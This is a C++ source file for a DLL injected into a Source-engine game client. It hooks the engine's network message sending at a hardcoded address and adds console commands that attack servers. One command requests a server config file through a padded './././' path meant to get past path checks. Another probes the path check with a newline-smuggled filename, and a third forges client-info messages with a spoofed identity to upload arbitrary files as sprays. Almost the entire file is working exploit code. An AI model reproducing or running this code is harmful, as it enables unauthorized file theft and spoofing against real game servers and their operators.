#define CLIENT_DLL
#include <Windows.h>
#include <algorithm>
#include "cdll_int.h"
#include "inetchannel.h"
#include "inetchannelinfo.h"
#include "icvar.h"
#include "filesystem.h"
#include "tier1/convar.h"
#include "netmessage.h"
#include "utlvector.h"
#include "bitbuf.h"
#include "chook.h"
#include "vhook.h"
#include "keyvalues.h"

#define SENDNETMSG_ADDR 0x200FF950

IVEngineClient* engine;
IFileSystem* filesystem;
ICvar* g_pCVar;

bool __stdcall AccessorFn(ConCommandBase* pCmd);
static DWORD s_dwAccessor = (DWORD)AccessorFn;
static PDWORD s_pdwAccessor = &s_dwAccessor;

static bool __stdcall AccessorFn(ConCommandBase* pCmd)
{
	pCmd->AddFlags(FCVAR_PLUGIN);
	pCmd->SetNext(NULL);
	g_pCVar->RegisterConCommandBase(pCmd);
	return true;
}

CON_COMMAND(net_request,"Request file")
{
	INetChannel* net = dynamic_cast<INetChannel*>
		(engine->GetNetChannelInfo());
	if(!net)
	{
		Warning("No net!\n");
		return;
	}

	Msg("Request id %d\n",net->RequestFile(
		engine->Cmd_Argv(1)));
}

CON_COMMAND(net_send,"Send file")
{
	INetChannel* net = dynamic_cast<INetChannel*>
		(engine->GetNetChannelInfo());
	if(!net)
	{
		Warning("No net!\n");
		return;
	}

	static unsigned int s_uID = 0;
	Msg("%s\n",net->SendFile(engine->
		Cmd_Argv(1),s_uID++) ? "OK":"FAIL");
}

CON_COMMAND(net_testkeyvaues,"")
{
	KeyValues* pKV = new KeyValues("Settings");
	pKV->SetString("key1","val1 :p");
	pKV->SetInt("key2",1);
	pKV->SetFloat("key3",2.5);
	pKV->SetColor("key4",Color(1,2,3,4));
	pKV->SaveToFile(filesystem,"_settings.txt","MOD");
	pKV->deleteThis();

	pKV = new KeyValues("Settings");
	pKV->LoadFromFile(filesystem,"_settings.txt","MOD");
	Msg("key1 %s\n",pKV->GetString("key1"));
	Msg("key2 %d\n",pKV->GetInt("key2"));
	Msg("key3 %f\n",pKV->GetFloat("key3"));
	Color col = pKV->GetColor("key4");
	Msg("key4 (%d %d %d %d)\n",col.r(),
		col.g(),col.b(),col.a());
	pKV->deleteThis();
}

CHook sendhook(SENDNETMSG_ADDR,6);
typedef bool (__thiscall* SendNetMsg_t)(void*,INetMessage*,bool);
SendNetMsg_t pOrig;

typedef struct {
	uint32 m_uTmp[4];

	CRC32_t m_nSendTableCRC;						//+4
	int m_nServerCount;								//+4
	bool m_bIsHLTV;									//+4
	uint32 m_nFriendsID;							//+4
	char m_FriendsName[MAX_PLAYER_NAME_LENGTH];		//+32
	CRC32_t m_nCustomFiles[MAX_CUSTOM_FILES];		//+16
} clc_ClientInfo_t;

clc_ClientInfo_t g_ClientInfo;

static bool __fastcall SendNetMsg_Hook(void* thisptr,void*,INetMessage* pMsg,bool b1)
{
	if(pMsg->GetType() == 8 && ((clc_ClientInfo_t*)pMsg)->m_nFriendsID != 0x1337)
	{
		memcpy(&g_ClientInfo,pMsg,sizeof(clc_ClientInfo_t));
		Msg("m_nServerCount %d\n",g_ClientInfo.m_nServerCount);
	}
	return pOrig(thisptr,pMsg,b1);
}

class CLC_ClientInfo : public CNetMessage
{
public:
	virtual int GetType(){return 8;}
	virtual const char* GetName(){return "clc_ClientInfo";}
	virtual bool WriteToBuffer(bf_write&);

	void AddFile(CRC32_t file);
private:
	CUtlVector<CRC32_t> m_Files;
};

void CLC_ClientInfo::AddFile(CRC32_t file)
{
	m_Files.AddToTail(file);
}

bool CLC_ClientInfo::WriteToBuffer(bf_write& bf)
{
	bf.WriteUBitLong(GetType(),5);

	bf.WriteLong(g_ClientInfo.m_nServerCount); //m_nServerCount
	bf.WriteLong(g_ClientInfo.m_nSendTableCRC); //m_nSendTableCRC
	bf.WriteOneBit(0); //m_bIsHLTV
	bf.WriteLong(0x3777);
	bf.WriteString("ZOLDAT");

	for(int i = 0; i < MAX_CUSTOM_FILES; i++)
	{
		if(i < m_Files.Count())
		{
			bf.WriteOneBit(1);
			bf.WriteUBitLong(m_Files[i],32);
		}
		else bf.WriteOneBit(0);
	}
	return true;
}

CON_COMMAND(clientinfo_sendspray,"Send custom spray.")
{
	INetChannel* netchan;
	if(!(netchan = (INetChannel*)engine->GetNetChannelInfo())) return;
	if(!filesystem->FileExists(engine->Cmd_Argv(1),"MOD"))
	{
		Warning("Spray not found!\n");
		return;
	}
	CRC32_t crc = rand();

	char hex[16] = {0};
	char fname[MAX_PATH] = {0};
	Q_binarytohex((const byte*)&crc,sizeof(crc),hex,sizeof(hex));
	Q_snprintf(fname,MAX_PATH,"downloads/%s.dat",hex);

	FileHandle_t fold = filesystem->Open(engine->Cmd_Argv(1),"rb","MOD");
	
	size_t uSize = filesystem->Size(fold);
	char* pBuf = new char[uSize];
	filesystem->Read(pBuf,uSize,fold);
	filesystem->Close(fold);
	fold = filesystem->Open(fname,"wb","MOD");
	filesystem->Write(pBuf,uSize,fold);
	filesystem->Close(fold);

	Msg("Copy to %s\n",fname);

	CLC_ClientInfo info;
	info.AddFile(crc);
	netchan->SendNetMsg(info);
}

typedef FileHandle_t (__thiscall* Open_t)(void*,const char*,const char*,const char*);
Open_t pOpen;
VHook* pOpenHook;

FileHandle_t __fastcall Open_Hook(void* thisptr,void*,
	const char* file,const char* mod,const char* path)
{
	return pOpen(thisptr,file,mod,path);
}

//200FFF90   56               PUSH ESI
typedef bool (*IsPathSecure_t)(const char*);
IsPathSecure_t pIsPathSecure = (IsPathSecure_t)0x200FFF90;

inline void check(const char* path)
{
	Msg("%s = %s\n",path,pIsPathSecure(path)?"true\n":"false\n");
}

CON_COMMAND(net_ispathsecure,"Check it")
{
	check(engine->Cmd_Argv(1));
}

CON_COMMAND(net_ispathsecure_format,"Check it")
{
	check("test.lua\n.txt");
}

CON_COMMAND(net_testrequest,"")
{
	INetChannel* net = dynamic_cast<INetChannel*>
		(engine->GetNetChannelInfo());
	if(!net)
	{
		Warning("No net!\n");
		return;
	}
	char szPath[640];
	memset(szPath,'\0',512);
	//238
	/*strcpy(szPath,"client.dll");
	int slen = strlen(szPath);
	memset(&szPath[slen],' ',512-slen);*/
	net->RequestFile("./cfg/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././server.cfg.txt");
}

CON_COMMAND(net_list,"")
{
	INetChannel* net = dynamic_cast<INetChannel*>
		(engine->GetNetChannelInfo());
	if(!net)
	{
		Warning("No net!\n");
		return;
	}

	CUtlVector<INetMessage*>* nets = (CUtlVector<INetMessage*>*)((char*)net+0x1DEC);
	Msg("Type\tName\tVTable\n");
	for(int i = 0; i < nets->Count(); i++)
	{
		INetMessage* msg = nets->Element(i);
		Msg("%d\t%s\t%p\n",msg->GetType(),
			msg->GetName(),*(PDWORD)msg);
	}
}

DWORD WINAPI StartThread(LPVOID)
{
	CreateInterfaceFn EngineFn
		= Sys_GetFactory("engine.dll");
	CreateInterfaceFn SteamFilesystem
		= Sys_GetFactory("filesystem_steam.dll");
	engine = (IVEngineClient*)EngineFn(VENGINE_CLIENT_INTERFACE_VERSION,0);
	filesystem = (IFileSystem*)SteamFilesystem("VFileSystem017",0);
	g_pCVar = (ICvar*)EngineFn(VENGINE_CVAR_INTERFACE_VERSION,0);

	pOrig = (SendNetMsg_t)sendhook.HookFunction((DWORD)SendNetMsg_Hook);
	ConCommandBaseMgr::OneTimeInit((IConCommandBaseAccessor*)&s_pdwAccessor);
	//filesystem->Open("","",""); //32
	return 0;
}

BOOL APIENTRY DllMain(HINSTANCE,DWORD dwF,LPVOID)
{
	if(dwF == DLL_PROCESS_ATTACH)
		CreateThread(0,0,StartThread,0,0,0);
	return TRUE;
}